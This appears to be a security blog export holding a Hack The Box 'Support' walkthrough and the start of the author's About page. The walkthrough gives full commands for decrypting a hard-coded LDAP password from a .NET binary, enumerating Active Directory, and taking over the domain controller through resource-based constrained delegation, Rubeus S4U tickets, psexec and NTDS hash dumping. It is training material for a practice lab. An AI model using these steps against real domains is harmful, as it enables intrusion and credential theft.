        "title": "Support HTB Walkthrough: Active Directory, RBCD, and MachineAccountQuota Exploitation",
        "tags": ["Box","HTB","Easy","Windows","LDAP","CSharp","RBCD","kerberos","MachineAccountQuota",],
        "content": "Intelligence Hack The Box Support Walkthrough/Writeup: https://app.hackthebox.com/machines/Support How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Standard Nmap Scan to get a lay of the land: I always do a basic one just to look for low hanging fruit, this means that whilst my main scan is running I can enumerate the low hanging fruit and look for easy wins. With that out the way I start my main nmap scan. sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP -iL scopeList Why I use this specific scan: -p-:\nScans all 65,535 TCP ports on the target(s). -sV:\nPerforms service version detection to determine what service and version is running on each open port. -sC:\nRuns a set of default scripts from Nmap\u0026rsquo;s script engine (NSE) that perform various checks like vulnerability detection, information gathering, etc. -O:\nAttempts to determine the operating system of the target machine. --disable-arp-ping:\nDisables ARP pinging; useful when ARP requests may not be useful or could be blocked by the network. -Pn:\nNo ping scan: Treats the target hosts as \u0026ldquo;up\u0026rdquo; without sending initial pings, useful for bypassing ping-based defenses. -oA FullTCP:\nSaves the scan results in three formats (.nmap, .xml, and .gnmap) with the filename prefix \u0026ldquo;FullTCP\u0026rdquo;, means I can then pass to other scanners such as aquatone or eyewitness which takes .xml NMAP files as input. -iL scopeList:\nThis is just my target list of hosts. I also map single domain to a bash alias in my ~/.zshrc as it\u0026rsquo;s convient for other tools In Depth Scan Complete: We can see the OS is most likely Windows Server 2022 \u0026amp; that SMB signing is enabled and required. Checking For LDAP Anonymous bind: As LDAP is running, I want to check if Anonymous Bind is enabled as it\u0026rsquo;s an easy win to gather information. If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using LDAP to perform these queries is that these are most likely not going to trigger any sort of AV etc as LDAP is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here https://github.com/bloodstiller/ldapchecker _\nI run my script but anonymous bind is not enabled, however we get some valuable information such as the Domain Functionality level. We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=support,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nserverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb SMB Enumeration: Connecting Via Null \u0026amp; Guest sessions: I try an null session but it is denied.\nHowever it does allow us to connect using the built-in \u0026ldquo;Guest\u0026rdquo; account, and we can read the support-tools share.\nConnecting to SMB: We can see 3 interesting files in the smb share. npp.8.4.1.portable.x64.zip SysinternalsSuite.zip I suspect this is just a copy of the popular SysInternals suite of tools, but want to verify myself that nothing additional has been added to the .zip UserInfo.exe.zip Th I download all the files: The last file is particular interesting, \u0026ldquo;UserInfo.exe.zip\u0026rdquo; as this does not look like a known binary, so may be made by the support staff themselves. UserInfo.exe Binary Enumeration: Running Strings On it: First of all let\u0026rsquo;s run strings on it to see if we can extract any valuable information: strings UserInfo.exe We can see references to enc(oding) passwords and getting passwords as well as usernames, first name, last name. We can also it tells us what version of the .NET framework is, v4.8 (this is useful for our next step) I am guessing, this is using LDAP to interact with the AD environment, this is only a guess though. Hopefully it should trigger some traffic in Wireshark if we run it. There is not much more information we can glean from strings so let\u0026rsquo;s move on. Running the binary itself: As it\u0026rsquo;s a windows binary we can either run it in windows or use Wine, as I run Arch (btw), as my host OS I am going to run it via Wine in my WM.\nLets check if the binary is 32 or 64 bit: We can see it\u0026rsquo;s 32bit so we need to install 32bit support for wine also. Detour, Lets install Wine on Kali Together: If you haven\u0026rsquo;t installed Wine in Kali before you need to follow the below steps: +Note+: Remember when we ran strings on the binary and we saw it was using v.4.8 of the .NET framework, well we need that information here to ensure we have the correct version running. # This is the what enables 32 bit architecture. sudo dpkg --add-architecture i386 sudo apt update sudo apt install wine # This is what installs the wine 32 bit libraries sudo apt install wine32:i386 winecfg # This is just a nice easier way to work with wine. sudo apt-get install winetricks winetricks dotnet48 # This is not wine based but we will need this to use LDAP (thank me later) sudo apt install winbind Running the Binary \u0026amp; Monitoring Traffic with Wireshark: We can see it takes a couple of args, find, user \u0026amp; enabling verbosity\nI setup Wireshark to monitor traffic and then run the below command:\n\u0026amp; get the error: 0114:err:winediag:ntlm_check_version ntlm_auth was not found After some googling, I find that the dep winbind is required, I install and then run again \u0026amp; I am given ALOT more options. First Real Run:\nI run the program and to make life easier check for all users. I see that I get a lot of traffic, however what is interesting is I am only getting the latter half of the connection as with LDAP there should be a bind request happening, however I am only getting the unbind…which is strange. Typically with the bind request the password, DN and auth types are passed but this is not present here. It could be Wine being unreliable so back to the drawing board. +Note+:\nOne thing that is interesting is that this program does not appear to take a password/creds as an argument \u0026amp; it also appears to have some LDAP strings within it. Which means unless the entire domain is running without the need the need for authentication (i doubt it) then there must be some hard-coded LDAP creds within this program. De-compiling the Binary with ILSpy: As I can\u0026rsquo;t see any traffic generated from the binary, which is odd as it does seem to be using LDAP parameters, I will de-compile the binary to see if there are any hard coded credentials/useful information within it.\nWe will use ILSpy to de-compile. It\u0026rsquo;s a cross platform tool that enables us to de-compile .NET programs.\nhttps://github.com/icsharpcode/AvaloniaILSpy What is ILSpy?: ILSpy is a tool for de-compiling .NET programs, which is a fancy way of saying it can take an already-compiled .NET application (the .exe or .dll files) and reverse-engineer it back into readable source code. It\u0026rsquo;s super handy if you\u0026rsquo;re trying to understand how a particular piece of software works, want to check for security vulnerabilities, or even need to recover your own code that you might have lost. ILSpy doesn\u0026rsquo;t give you the exact original code, but it gives you something close enough that you can follow along. It’s open-source and free, which makes it a go-to for a lot of developers, especially in the .NET community. Whether you\u0026rsquo;re doing research, debugging, or just satisfying your curiosity, ILSpy can be a powerful tool to have in your toolkit. _\nInstall ILSpy: If you haven\u0026rsquo;t got it installed, you can do so here. wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64/Release.zip unzip Linux.x64.Release.zip unzip ILSpy-linux-x64-Release.zip # This is the second archive we must extract Launch ILSpy:\ncd artifacts/linux-x64 sudo ./ILSpy Load our binary \u0026amp; turn on dark mode:\nDiscoveries: I search for ldap and as suspected I find the following information. As well as the domain DN in an LDAP query string \u0026quot;LDAP://support.htb I also see that a variable call password is being passed as well and that the AuthenticationTypes is set to 1 This is an LDAP Bind Request with all the information being passed: The below is taken from https://ldap.com/the-ldap-bind-operation/ An LDAP bind request includes three elements: The LDAP protocol version that the client wants to use. This is an integer value, and version 3 is the most recent version. Some very old clients (or clients written with very old APIs) may still use LDAP version 2, but new applications should always be written to use LDAP version 3. The DN of the user to authenticate. This should be empty for anonymous simple authentication, and is typically empty for SASL authentication because most SASL mechanisms identify the target account in the encoded credentials. It must be non-empty for non-anonymous simple authentication. The credentials for the user to authenticate. For simple authentication, this is the password for the user specified by the bind DN (or an empty string for anonymous simple authentication). For SASL authentication, this is an encoded value that contains the SASL mechanism name and an optional set of encoded SASL credentials. This is important as it would appear that the password, is not being requested for on the CLI as there is no parameter for that which means it must be hard-coded. Finding the password string: I search for enc_password which we saw earlier when we ran strings and get the below result: Finding the function: We can see that the variable is used in the Protected function so I search for that function: So this was completley out of my wheelhouse in terms of experience, I have very rudimentary python programming experience at best \u0026amp; I have no background in C#. But let\u0026rsquo;s break it down so it\u0026rsquo;s easier to understand. There are values: There is a base64 encoded password enc_password = \u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;; A byte array (key) with the value: \u0026quot;armando\u0026quot; A function (think this is technically a method?): There is an array which the password is being passed to \u0026amp; converted from base64: byte[] array = Convert.FromBase64String(enc_password); A second array which has the value of the first array: byte[] array2 = array; A for loop that is manipulating these with this piece of logic: array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu); It then returns array2 using \u0026ldquo;GetString\u0026rdquo; (which I am guessing is a decoded password) return Encoding.Default.GetString(array2) This is on it\u0026rsquo;s surface seems quite simple, we take two values, key \u0026amp; enc_password apply the following logic array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu); \u0026amp; get a password……but how? Decoding the logic: So this took me on a deep dive as I had no idea what was going on \u0026amp; had to decode this function line by line:\nStatic elements: Password: private static string enc_password = \u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;; The base64 encrypted password. Key: private static byte[] key = Encoding.ASCII.GetBytes(\u0026quot;armando\u0026quot;); A byte array created from the string \u0026ldquo;armando\u0026rdquo;, which will be used as the decryption key. Function/Method Explanation: Base64 Decoding: The encrypted password (enc_password) is a Base64 encoded string. byte[] array = Convert.FromBase64String(enc_password); converts this string back into a byte array (array). Decryption Process: (The Magic) The code loops through each byte of the array (array), performing two XOR operations on each byte: The XOR symbol in C# sharp is ^. This part is what took me longest as I did not have any clue about XOR as a concept as it had never come up for me. What is XOR?\nXOR (Exclusive OR) is a bitwise operation that takes two bits and returns 1 (True) if the bits are different, and 0 (False) if they are the same. For example: 1 XOR 0 = 1 (True) 0 XOR 1 = 1 (True) 1 XOR 1 = 0 (False) 0 XOR 0 = 0 (False) Microsoft have a handy explanation:\nhttps://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators#logical-exclusive-or-operator- _\nXOR Operation 1 in the function:\narray2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) This operation is the first step in decrypting the data. Details:\nAccess the i-th Byte:\narray[i] refers to the i-th byte of the encrypted byte array (derived from the Base64 decoded password). key[i % key.Length] refers to the corresponding byte from the decryption key. % The (modulus) operator ensures that if i is greater than the length of the key, it wraps around to the beginning of the key to start again. XOR with Key Byte:\nThe encrypted byte in array[i] is XORed with the corresponding byte from the key. This is the first step to reversing the scrambling of the data. This operation undoes the initial encryption that mixed the original data with the key during encryption. By applying the same key in reverse, this step partially restores the original data. Example Using Simple Hex Value:\nThis is just to show how it works, not what is happening here. If array[i] is 0x5A (binary 01011010), and key[i % key.Length] is 0x41 (binary 01000001), Bit Pass (0x5A) Key (0x41) XOR Result (0x1B) True/False Bit 7 (MSB) 0 0 0 False Bit 6 1 1 0 False Bit 5 0 0 0 False Bit 4 1 0 1 True Bit 3 1 0 1 True Bit 2 0 0 0 False Bit 1 1 0 1 True Bit 0 (LSB) 0 1 1 True XOR Operation 2:\n^ 0xDFu This operation completes the decryption by reversing the final layer of encryption. Details:\nHexadecimal XOR:\nAfter the first XOR operation, the result is XORed again with hexidecimal value of 0xDF, which is the binary value 11011111. Final XOR Operation:\nThis is the final step in reversing the scrambling of the data. It undoes the last layer during encryption, restoring the byte to its original, unencrypted value. By XORing with 0xDF, it reverses the effect of the same XOR operation that was applied during encryption. Example (continuing from above):\nBit Position Pass (0x5A) Key (0x41) XOR Result (0x1B) True/False Second XOR Operation Key (0xDF) Final XOR Result (0xC4) True/False Bit 7 (MSB) 0 0 0 False 00011011 1 1 True Bit 6 1 1 0 False 00011011 1 1 True Bit 5 0 0 0 False 00011011 0 0 False Bit 4 1 0 1 True 00011011 1 0 False Bit 3 1 0 1 True 00011011 1 0 False Bit 2 0 0 0 False 00011011 1 1 True Bit 1 1 0 1 True 00011011 1 0 False Bit 0 (LSB) 0 1 1 True 00011011 1 0 False Summary of the Two XOR Operations:\nFirst XOR (with the key): The encrypted byte is XORed with the corresponding byte from the key. This operation \u0026ldquo;removes\u0026rdquo; the encryption that was applied using this key. It reverses the step where each byte of the original password was XORed with the key to produce an intermediate decrypted byte. Second XOR (with 0xDF): The result of the first XOR operation is then XORed with the fixed value 0xDF. This step \u0026ldquo;undoes\u0026rdquo; the final layer of encryption that was applied when the original password was encrypted. The combination of these two XORs returns the byte back to its original (clear text) state before it was encrypted. Conversion to String: After all bytes have been processed, the resulting byte array (array2) is converted back into a string using: return Encoding.Default.GetString(array2);. This string is the original decrypted password. Returning the Password: Finally, the decrypted password string is returned by the getPassword() method. In Simple Terms: The code takes an encrypted password stored as a Base64 string. It converts it into bytes and then decrypts it using a key (\u0026ldquo;armando\u0026rdquo;) and a specific XOR operation. The decrypted result is then converted back into a readable string, which is the original password. Coding a Decoder in python: So we know how the encryption \u0026amp; decryption process works, we now need to code this ourselves. As I have some experience in Python lets use that. import base64 # Importing the base64 module to handle base64 encoding and decoding from itertools import cycle # Importing the cycle function from itertools to cycle through the key # Decoding the base64 encoded string into bytes. encPassword = base64.b64decode(\u0026#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026#34;) # Defining the key as a byte string which will be used in the XOR operation for decryption. key = b\u0026#34;armando\u0026#34; # Defining the hexvalue \u0026#34;0xDFu\u0026#34; key as an integer value. For our second round of XOR key2 = 223 decryptedPass = \u0026#39;\u0026#39; for byteEncPass, byteKey in zip(encPassword, cycle(key)): decryptedPass += chr(byteEncPass ^ byteKey ^ key2) # Printing the final decrypted result. print(decryptedPass) Code Breakdown: Imports:\nimport base64: Imports the base64 module for handling base64 encoding and decoding. from itertools import cycle: Imports the `cycle` function from `itertools` to create an infinite iterator that cycles through the key. Decoding Base64 Encoded String:\nencPassword = base64.b64decode(\u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;): Decodes the base64 encoded string into a byte sequence (`encPassword`). `encPassword` will hold the decoded binary data that needs to be decrypted. Key Definitions:\nkey = b\u0026quot;armando\u0026quot;: Defines the key \u0026ldquo;armando as a byte string which will be used in the first XOR decryption process. key2 = 223: Defines the second key, which is just the decimal representation of the hex value 0xDFu which will be used in the second XOR operation during decryption. Decryption Process:\ndecryptedPass = '':\nInitializes an empty string decryptedPass to store the decrypted result. Looping and Decrypting:\nfor byteEncPass, byteKey in zip(encPassword, cycle(key))::\nLoops through each byte of the encPassword and pairs it with each byte of the key using the zip() function. If the key is shorter than encPassword it will repeat the key indefinately cycle(key): This is necessary as the key armando is shorter than the base64 decoded string. XOR Decryption:\ndecryptedPass += chr(byteEncPass ^ byteKey ^ key2): Decrypts each byte by performing an XOR operation between: byteEncPass (current byte from encPassword), byteKey (corresponding byte from `key`), key2 (second key). Converts the result of the two XOR operation to a character using chr() and appends those to our variable decryptedPass. Output:\nprint(decryptedPass): Prints the final decrypted string (decryptedPass) which is the original password before encoding and encryption. Running the script and get the password: I run my script and it appears to have reversed the encryption \u0026amp; spat out a clear text ldap password! 2. Foothold: Enumerating the Domain using LDAP: As we now have a foothold in the domain we can query it using standard LDAP queries: Dump All Domain Data:\nI initially dump everything I can with the following command: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; \u0026quot;*\u0026quot; \u0026gt;\u0026gt; ldapDump.txt I dump all information like this as sometimes it\u0026rsquo;s just good to grab everything all at once in-case we hit a dead end and then need to run some searches on it. Dump All Users whos description field is not blank:\nI also run the following command that will return all users who\u0026rsquo;s description field is not blank. ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(description=*))\u0026quot; I like this query as it\u0026rsquo;s an easy way to pull credentials if they are stored in the description field, unfortunately there was nothing there this time. Finding Passwords in User Fields: I Dump all user information:\nI run this query to dump all the user information and sAMAccount name too: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(sAMAccountName=*))\u0026quot; After sifting through it I find this which looks like a password in the information field for the \u0026ldquo;support\u0026rdquo; account: Verify if the password is valid using netex:\nI verify if it is valid using netexec: IT IS!! We have a valid way into the domain! +Note+: Due to this discovery I have now added the below search to my notes so that in future I also check the \u0026ldquo;info\u0026rdquo; field for passwords: ldapsearch -H ldap://$box -D ldap@\u0026lt;domain\u0026gt;.\u0026lt;domain\u0026gt; -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=\u0026lt;domain\u0026gt;,dc=\u0026lt;domain\u0026gt;\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(info=*))\u0026quot; Connecting with Evil-WinRM: I connect to the domain using evil-winrm as ports 5985/5986 are both open and running. 3. Priv-Esc: Enumerating the domain with bloodhound: I upload SharpHound.exe using Evil-WinRM and begin scanning the domain.\nChecking for nested group memberships:\nWhilst bloodhound is running I check what nested groups the user we control is a part of. (This will show up in bloodhound, however running this early will tell us if we are part of any known high value windows groups and can provide a clear path to domain takeover.)\nCommand: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)\u0026quot;\nExplanation:\n\u0026quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)\u0026quot;: This filter leverages the LDAP_MATCHING_RULE_IN_CHAIN rule. The OID being (1.2.840.113556.1.4.1941) It searches for members recursively across group memberships. So it checks if the object CN=support,CN=Users,DC=support,DC=htb is a member of any groups, directly or indirectly. Result:\nIt shows that user we control is actually part of a group called \u0026quot;Shared Support Accounts\u0026quot; This is not a standard group in AD, but it\u0026rsquo;s a discovery none the less. GenericAll privileges on the domain controller. In bloodhound we can see our user has the GenericAll privilege over the Domain Controller, due to the fact that they are part of the \u0026ldquo;Shared Support Accounts\u0026rdquo; group.\nIf you are unfamiliar with the GenericAll privilege, it\u0026rsquo;s incredibly powerful and dangerous.\nDisplay Name: GenericAll Common Name: GA/RIGHT_GENERIC_ALL Hex Value: 0x10000000 Interpretation: Allows creating or deleting child objects, deleting a sub-tree, reading and writing properties, examining child objects and the object itself, adding and removing the object from the directory, and reading or writing with an extended right. This is equivalent to the object-specific access rights bits (DE | RC | WD | WO | CC | DC | DT | RP | WP | LC | LO | CR | VW) for AD objects. In simple terms: This is also known as full control. This permission allows the trustee to manipulate the target object however they wish. Attack Options: Users: If we have this privilege over a user we can use a targeted kerberoasting attack \u0026amp; add an SPN to the user, request that ticket and then crack it offline. Groups: We can then add ourselves or other users to the group, this is especially useful if the group grants privileges by virtue of membership. Computers: We can perform a Resource Based Constrained Delegation attack. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution We add a fake computer to the domain \u0026amp; configure the computer we have GenericAll permissions over to allow our fake computer to act on behalf of it. This enables us to impersonate a high-privileged user on the domain and request a kerberos ticket for that user we can then either crack or use it in a pass the ticket attack. Resource Based Constrained Delegation Crash Course: Resource-based Constrained Delegation (RBCD) is a feature in Windows Active Directory that allows services to impersonate users under specific conditions. It\u0026rsquo;s an advanced way to handle delegation where permissions are more controlled compared to older methods. Key Differences from Basic Constrained Delegation: Basic Constrained Delegation: Allows a service to impersonate any user to another service. Example: If Service A has permission, it can act as any user when accessing Service B. RBCD: Instead of granting Service A permission to impersonate users, you set permissions on the resource (like Service B) itself, determining which services (like Service A) can impersonate users. The resource (Service B) has an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity. This lists services that can impersonate users for this resource. Why It\u0026rsquo;s Important: With RBCD, no domain admin rights are needed to configure it. Anyone with write permissions to a computer account can modify this setting. Permissions like GenericWrite, WriteDacl, WriteProperty, etc., give access to modify the delegation. This contrasts with other delegation methods that require domain admin rights. The attack, Kerberos Resource-based Constrained Delegation - Computer Object Takeover: The attack (High Level): We are going to create a fake computer on the domain. Configure RBCD by setting the msds-allowedtoactonbehalfofotheridentity to allow our computer to act on behalf of the DC. Perform \u0026amp; S4U attack to get a kerberos ticket on behalf of the administrator. Pass the admins ticket to get RCE on the target. Attack Requirements: Requirement 1 - Ensure we can add machines to the domain: To check if our user has the ability to do this we need to check the ms-ds-machineaccountquota attribute. By default it\u0026rsquo;s set to 10 on domains, but I have seen domains where the admins have, rightfully, disabled it. Checking it using netexec: As we can see it\u0026rsquo;s set to 10 this means we can add up-to 10 machines to this domain. So we can perform the attack Satisfied Requirement 2 - A target computer: We know this is the DC of the domain (and we only have 1 target for this so it has to be that) Satisfied Requirement 3 - Admins on the domain: The LDAP query for this is pretty simple: \u0026quot;(\u0026amp;(objectClass=Person)(adminCount=1))\u0026quot; Satisfied Requirement 4 - There must be at least One Domain Controller running Windows Server 2012 or newer in the environment. At the start of the engagement we can see that the level of the domainFunctionaility level is 7. Level 7, requires that the domain environment be running Windows Server 2016 or newer. Satisfied Requirement 5 - The msds-allowedtoactonbehalfofotheridentity must be empty: This attribute allows a service to impersonate or act on behalf of another account (e.g., a user or computer) when accessing network resources. Which is exactly what we need, as our fake computer will act on behalf of the DC. I upload PowerView.ps1 to the host \u0026amp; then run the following command: Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity Check the Value: We can see it\u0026rsquo;s empty, this is good, as it means we can set the value. If this was already set we could not progress unless we controlled that specific account. Requirement 6 - Various Fake Machine Requirements: We actually don\u0026rsquo;t need to worry about these at the moment, these will be generated whilst we perform the attack. The Fake Computer SID The Name of Fake Computer The Fake Computer Password 4. Ownership: Performing the Attack: Great video of the attack here: https://youtu.be/RUbADHcBLKg?si=bro7uomiQtukaIpe\u0026t=563 1. Add the Computer: Create the computer using Impacket:\nimpacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'hackme' -dc-ip $dcip support.htb/support I verify the computer was made using PowerView:\nGet-AdComputer -identity bloodstiller +Note+: be patient, this can hang for a number of seconds! I also grab the SID of the computer as we will need this moving forward: S-1-5-21-1677581083-3380853377-188903654-6101 2. Modify the msds-allowedtoactonbehalfofotheridentity value on the target: Configure RBCD Using Sharpview\nVerity the PrincipalAllowedToDelegateToAccount value is empty:\nGet-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount Add our computer as to the PrincipalAllowedToDelegateToAccount value:\nSet-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount bloodstiller$ +Note+: be patient, this can hang for a number of seconds! Verify the attribute is set:\nGet-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount It should now contain our fake computer name Verify the msds-allowedtoactonbehalfofotheridentity value has changed:\nGet-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity\nWe can see it has but it\u0026rsquo;s just a series of numbers? It\u0026rsquo;s RAW bytes which we need to convert back to the SID to verify it works.\n$TargetComputer = \u0026#34;DC.support.htb\u0026#34; $RawBytes = Get-DomainComputer $TargetComputer -Properties \u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39; | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl As we can see the AceType is set to AcessAllowed AceType: Represents the type of Access Control Entry (ACE) in the Access Control List (ACL). In this case, the value is AccessAllowed, meaning it grants permission to the associated SecurityIdentifier.(SID). And it has the SID from the fake machine we made earlier so therefore it means that the ACE is set to allow our machine to act on behalf of the domain controller DC.SUPPORT.HTB Minor recap:\nWe have created a fake machine on the domain. We have configured our machine to act on behalf of DC.SUPPORT.HTB 3. Craft Kerberos Ticket with Rubeus for local admin on DC01: Retrieve the password hash that was used to create the computer object:\n.\\Rubeus.exe hash /password:hackme /user:bloodstiller$ /domain:support.htb Breakdown: hash: Instructs Rubeus to extract a hash. /password:hackme: Specifies the password for the user (hackme). /user:bloodstiller$: Specifies the username of the account we want the password for (bloodstiller$). +Note+: we have the $ as this is a machine account /domain:support.htb: Specifies the domain (support.htb). We need this so we can craft tickets. Hash = 601EAB3FDFB146C4ECD8F800C987D621 Generate Kerberos tickets for the Administrator by peforming the S4U attack:\n.\\rubeus.exe s4u /user:bloodstiller$ /rc4:601EAB3FDFB146C4ECD8F800C987D621 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt /nowrap Breakdown: s4u: Service for User functionality, used to request a service ticket for a user. /user:bloodstiller$: Specifies the user (bloodstiller$), (usually a service account). /rc4:601EAB3FDFB146C4ECD8F800C987D621: The RC4-HMAC key (NTLM hash) for the user (bloodstiller$). /impersonateuser:Administrator: Specifies the user to impersonate (Administrator). /msdsspn:cifs/dc.support.htb: Specifies the SPN (Service Principal Name) for the service to request a ticket (CIFS on dc.support.htb). /domain:support.htb: Specifies the domain (support.htb). /ptt: Pass-the-ticket option to inject the resulting ticket into memory for immediate use. /nowrap: Ensures the ticket is not Base64-encoded (used for better formatting). No idea why nowrap is not standard for the output… 4. Root…..right? We should be able to access the necessary resources locally as we have performed a PTT attack but for some reason it doesn\u0026rsquo;t work, (I actually went to the creators page to see why \u0026amp; it doesn\u0026rsquo;t work for him either so I am not crazy) https://0xdf.gitlab.io/2022/12/17/htb-support.html#get-domain-tgt Instead we will need to convert our tickets and access the target it a different wat. 5. Convert our tickets for use on Linux: For all intents \u0026amp; purposes we now have everything we need to access the domain, however we need to perform some conversions before we can get RCE on the DC from our linux host, luckily we can do this with the impacket-tool tickerConverter We take the base64 encoded string from rubeus and put into a file called b64.ticket:\nWe then decode that ticket whilst piping it into another file called admin.kirbi:\nbase64 -d b64.ticket \u0026gt; admin.kirbi .kirbi is the extension required for us to convert our ticket. We then use impacket-ticketconvert to convert our .kirbi to a .ccache\nccache: (Credential Cache) files are used in Linux systems to store Kerberos tickets and other security credentials obtained through the Kerberos authentication process. impacket-ticketConverter admin.kirbi admin.ccache Set the KRB5CCNAME Variable \u0026amp; get root\nKR5CCNAME is an Environment variable used by Kerberos 5 (KRB5) used by Linux as pointer to the .ccache file KRB5CCNAME=admin.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass 5. Pillaging/Persistence: Initially I try and run Secrets-Dump but it\u0026rsquo;s not playing ball:\nSo I upload LaZagne.exe:\nI find nothing other than the machine hash, which will not be crackable as these are handled by the OS itself, extremely long and rotated often. Dumping NTDS via netexec:\nSo now I have all the hashes from NTDS, including Domain Admin, I have complete domain ownership. Verify The Admin Hash Works:\nIt works, so now I can conclude this box as I can regain entry anytime via the Admin hash or any of the hashes I have. Lessons Learned: What did I learn? I learned about XOR and reverse engineering the encryption. I was rusty on kerberos so took me some time to get my head around RBCD again as I haven\u0026rsquo;t done it in some time. I re-learned about S4U attacks as it had been some time. What silly mistakes did I make? I was an idiot and didn\u0026rsquo;t change my hosts file for ages after a box reboot and couldn\u0026rsquo;t figure out why my LDAP binds were not working. Should have dumped NTDS prior to running LaZagne.exe \u0026amp; Secrets-Dump. Thoughts: Easy my ass….reverse engineering a binary, doing an RBCD kerberos attack that should work but doesn\u0026rsquo;t so we have to export tickets to access remotely. For me this was an easy to medium box. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

    },

        "title": "About Bloodstiller: Ethical Hacker \u0026 Active Directory Security Specialist",
        "tags": ["About","Ethical Hacking","Active Directory","Security","Blog",],
        "content": "Hack the Planet Can you hear me? Is this thing on?\nI\u0026rsquo;m Bloodstiller, a penetration tester/security researcher with a passion for security and privacy. My focus is on Active Directory (AD) security, working to protect enterprise networks. I have also started to enjoy doing web application work as of late.\nI\u0026rsquo;m always exploring new techniques and keeping up with the latest threats. This blog serves as a way for me to share insights, tips, and experiences from my journey in hacking.\nCurrently, my primary focus is providing Hack The Box walkthroughs. These detailed guides not only help others but also deepen my own understanding of various concepts and attacks. Each walkthrough showcases my personal approach to solving challenges.\nThe Goals of This Blog: Provide practical examples of ethical hacking techniques. Help fellow security enthusiasts improve their skills. Demonstrate real-world applications of cybersecurity concepts. Foster a community built on knowledge sharing and continuous learning. Understand the concepts myself. Realistic Troubleshooting, Bones And All: My walkthroughs include all the troubleshooting steps I go through when things don\u0026rsquo;t go as planned. Many walkthroughs jump from point A to point B effortlessly, but the reality is often much messier—especially for beginners. I 